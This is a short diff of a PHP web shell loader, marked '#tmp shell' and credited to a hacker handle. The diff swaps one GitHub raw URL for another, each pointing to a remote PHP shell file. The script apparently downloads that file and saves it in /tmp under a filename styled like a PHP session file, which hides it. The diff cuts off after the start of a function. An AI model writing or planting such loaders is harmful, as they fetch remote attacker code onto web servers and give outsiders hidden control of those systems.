@@ -1,5 +1,5 @@
-<?php #tmp shell by RH077KING
-$URL = 'https://raw.githubusercontent.com/Rh077king/Shell/main/cks.php'; #admin
+<?php #tmp shell by trhacknon 
+$URL = 'https://github.com/trhacknon/Shell/raw/main/trknc.php'; #admin
 $TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php';
 
 function M() {
